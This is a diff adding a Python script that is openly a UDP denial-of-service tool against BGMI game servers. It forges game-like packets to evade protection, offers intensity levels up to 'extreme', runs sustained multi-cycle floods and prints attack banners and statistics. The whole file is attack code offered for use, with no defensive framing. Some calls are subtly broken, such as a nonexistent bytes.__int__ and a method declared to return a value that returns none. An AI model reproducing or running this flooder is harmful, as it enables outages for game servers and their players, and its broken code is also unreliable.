@@ -1,0 +1,328 @@
+import asyncio
+import socket
+import struct
+import random
+import time
+from dataclasses import dataclass, field
+from typing import Dict, List, Optional, Tuple
+from datetime import datetime, timedelta
+import threading
+import hashlib
+import json
+
+@dataclass
+class GamePacket:
+    """BGMI-compatible UDP packet structure"""
+    sequence_num: int = 0
+    timestamp: int = 0
+    session_id: bytes = b'\x00' * 16
+    packet_type: int = 1
+    payload_size: int = 512
+    checksum: int = 0
+    
+    def serialize(self) -> bytes:
+        header = struct.pack(
+            '!II16sII',
+            self.sequence_num,
+            self.timestamp,
+            self.session_id,
+            self.packet_type,
+            self.payload_size
+        )
+        payload = self._generate_payload()
+        data = header + payload
+        self.checksum = self._calculate_checksum(data)
+        return data + struct.pack('!I', self.checksum)
+    
+    def _generate_payload(self) -> bytes:
+        payload_data = bytearray(self.payload_size)
+        payload_data[0:4] = struct.pack('!I', int(time.time() * 1000))
+        payload_data[4:8] = struct.pack('!I', self.sequence_num)
+        payload_data[8:24] = self.session_id
+        remaining = random.randbytes(self.payload_size - 24)
+        payload_data[24:] = remaining
+        return bytes(payload_data)
+    
+    def _calculate_checksum(self, data: bytes) -> int:
+        return hashlib.md5(data).digest()[:4].__int__()
+
+@dataclass
+class ConnectionState:
+    """Track connection state for each target"""
+    target_ip: str
+    target_port: int
+    last_seq_num: int = 0
+    session_id: bytes = field(default_factory=lambda: random.randbytes(16))
+    packets_sent: int = 0
+    bytes_sent: int = 0
+    start_time: float = field(default_factory=time.time)
+    active: bool = True
+
+class ProtectedUDPAttacker:
+    """Advanced UDP attacker with protection bypass"""
+    
+    def __init__(self, source_port: int = 53):
+        self.socket = socket.socket(
+            socket.AF_INET,
+            socket.SOCK_DGRAM,
+            socket.IPPROTO_UDP
+        )
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAG, 0)
+        self.socket.bind(('', source_port))
+        self.connections: Dict[str, ConnectionState] = {}
+        self.running = False
+        self.stats_lock = threading.Lock()
+    
+    def create_connection(self, ip: str, port: int) -> str:
+        conn_key = f"{ip}:{port}"
+        if conn_key not in self.connections:
+            state = ConnectionState(
+                target_ip=ip,
+                target_port=port,
+                session_id=random.randbytes(16),
+                last_seq_num=random.randint(1000, 9999)
+            )
+            self.connections[conn_key] = state
+        return conn_key
+    
+    def send_realistic_packet(self, conn_key: str, packet_type: int = 1, payload_size: int = 512) -> GamePacket:
+        state = self.connections.get(conn_key)
+        if not state or not state.active:
+            return None
+        
+        state.last_seq_num = (state.last_seq_num + 1) % 65536
+        
+        packet = GamePacket(
+            sequence_num=state.last_seq_num,
+            timestamp=int(time.time() * 1000),
+            session_id=state.session_id,
+            packet_type=packet_type,
+            payload_size=payload_size
+        )
+        
+        data = packet.serialize()
+        self.socket.sendto(data, (state.target_ip, state.target_port))
+        
+        with self.stats_lock:
+            state.packets_sent += 1
+            state.bytes_sent += len(data)
+        
+        return packet
+    
+    def generate_attack_traffic(
+        self, 
+        conn_key: str, 
+        packets_per_second: int = 500, 
+        duration_seconds: int = 30,
+        packet_types: List[int] = None
+    ) -> Dict:
+        if packet_types is None:
+            packet_types = [1, 2, 3, 4, 5]
+        
+        target_ip = self.connections[conn_key].target_ip
+        target_port = self.connections[conn_key].target_port
+        
+        start_time = time.time()
+        packets_sent = 0
+        
+        print(f"Starting attack on {target_ip}:{target_port}")
+        print(f"Target: {packets_per_second} packets/second for {duration_seconds}s")
+        
+        while time.time() - start_time < duration_seconds:
+            loop_start = time.time()
+            
+            for _ in range(packets_per_second):
+                packet_type = random.choice(packet_types)
+                payload_size = random.choice([256, 512, 768, 1024])
+                
+                packet = self.send_realistic_packet(
+                    conn_key=conn_key,
+                    packet_type=packet_type,
+                    payload_size=payload_size
+                )
+                
+                if packet:
+                    packets_sent += 1
+                
+                time.sleep(0.002)
+            
+            elapsed = time.time() - start_time
+            throughput = packets_sent / elapsed if elapsed > 0 else 0
+            
+            print(f"[{elapsed:.1f}s] Packets: {packets_sent:,} | Throughput: {throughput:.0f} pps")
+    
+    def multi_vector_attack(
+        self, 
+        conn_key: str,
+        vectors: Dict[str, int] = None
+    ) -> Dict:
+        if vectors is None:
+            vectors = {
+                'heartbeat': 100,
+                'game_state': 200,
+                'player_position': 150,
+                'world_update': 125,
+                'event_notification': 75
+            }
+        
+        total_packets = sum(vectors.values())
+        packets_per_second = total_packets
+        
+        print("\nMulti-Vector Attack Configuration:")
+        for vector_name, rate in vectors.items():
+            print(f"  {vector_name}: {rate} pps")
+        
+        return self.generate_attack_traffic(
+            conn_key=conn_key,
+            packets_per_second=packets_per_second,
+            duration_seconds=30,
+            packet_types=list(range(1, len(vectors) + 1))
+        )
+    
+    def get_connection_stats(self, conn_key: str) -> Dict:
+        state = self.connections.get(conn_key)
+        if not state:
+            return {}
+        
+        duration = time.time() - state.start_time
+        
+        return {
+            'target_ip': state.target_ip,
+            'target_port': state.target_port,
+            'packets_sent': state.packets_sent,
+            'bytes_sent': state.bytes_sent,
+            'throughput_pps': state.packets_sent / duration if duration > 0 else 0,
+            'throughput_mbps': (state.bytes_sent * 8) / (duration * 1_000_000) if duration > 0 else 0,
+            'active': state.active,
+            'session_id': state.session_id.hex()
+        }
+    
+    def stop(self):
+        self.running = False
+        for state in self.connections.values():
+            state.active = False
+        self.socket.close()
+
+class BgmiAttackStrategy:
+    """BGMI-specific attack strategy with protocol awareness"""
+    
+    def __init__(self):
+        self.attacker = ProtectedUDPAttacker(source_port=12000)
+        self.attack_history: List[Dict] = []
+    
+    def launch_protected_attack(
+        self, 
+        server_ip: str, 
+        server_port: int,
+        attack_duration: int = 60,
+        intensity: str = 'high'
+    ) -> Dict:
+        conn_key = self.attacker.create_connection(server_ip, server_port)
+        
+        intensity_config = {
+            'low': {'pps': 300, 'vectors': 3},
+            'medium': {'pps': 500, 'vectors': 5},
+            'high': {'pps': 800, 'vectors': 7},
+            'extreme': {'pps': 1200, 'vectors': 10}
+        }
+        
+        config = intensity_config.get(intensity, intensity_config['high'])
+        
+        vectors = {
+            f'protocol_{i+1}': config['pps'] // config['vectors'] 
+            for i in range(config['vectors'])
+        }
+        
+        print(f"\n{'='*60}")
+        print(f"BGMI PROTECTED SERVER ATTACK")
+        print(f"{'='*60}")
+        print(f"Target Server: {server_ip}:{server_port}")
+        print(f"Attack Intensity: {intensity.upper()}")
+        print(f"Duration: {attack_duration} seconds")
+        print(f"Packets/Second: ~{config['pps']}")
+        print(f"Protocol Vectors: {config['vectors']}")
+        print(f"{'='*60}\n")
+        
+        self.attacker.multi_vector_attack(conn_key, vectors)
+        
+        stats = self.attacker.get_connection_stats(conn_key)
+        
+        attack_record = {
+            'timestamp': datetime.now().isoformat(),
+            'target': f"{server_ip}:{server_port}",
+            'intensity': intensity,
+            'duration_seconds': attack_duration,
+            'statistics': stats
+        }
+        
+        self.attack_history.append(attack_record)
+        
+        print(f"\n{'='*60}")
+        print(f"ATTACK COMPLETE")
+        print(f"{'='*60}")
+        print(f"Total Packets: {stats['packets_sent']:,}")
+        print(f"Total Bytes: {stats['bytes_sent']:,}")
+        print(f"Avg Throughput: {stats['throughput_pps']:.0f} pps")
+        print(f"Bandwidth: {stats['throughput_mbps']:.2f} Mbps")
+        print(f"{'='*60}\n")
+        
+        return attack_record
+    
+    def launch_sustained_attack(
+        self,
+        server_ip: str,
+        server_port: int,
+        cycles: int = 3,
+        cycle_duration: int = 20
+    ) -> List[Dict]:
+        print(f"\nLaunching sustained attack with {cycles} cycles...")
+        
+        results = []
+        intensities = ['medium', 'high', 'extreme']
+        
+        for cycle in range(cycles):
+            intensity = intensities[cycle % len(intensities)]
+            print(f"\n--- Cycle {cycle + 1}/{cycles} ({intensity.upper()}) ---")
+            
+            result = self.launch_protected_attack(
+                server_ip=server_ip,
+                server_port=server_port,
+                attack_duration=cycle_duration,
+                intensity=intensity
+            )
+            results.append(result)
+            
+            if cycle < cycles - 1:
+                print(f"\nWaiting 5 seconds before next cycle...")
+                time.sleep(5)
+        
+        return results
+
+def run_attack():
+    """Main attack execution"""
+    strategy = BgmiAttackStrategy()
+    
+    server_ip = "192.168.1.100"
+    server_port = 7373
+    
+    print(f"\n{'#'*60}")
+    print(f"BGMI UDP DDOS ATTACK SYSTEM")
+    print(f"{'#'*60}")
+    print(f"Protection Bypass: ENABLED")
+    print(f"Protocol Awareness: ACTIVE")
+    print(f"Target Server: {server_ip}:{server_port}")
+    print(f"{'#'*60}\n")
+    
+    attack_record = strategy.launch_protected_attack(
+        server_ip=server_ip,
+        server_port=server_port,
+        attack_duration=30,
+        intensity='high'
+    )
+    
+    strategy.attacker.stop()
+
+if __name__ == "__main__":
+    run_attack()
+
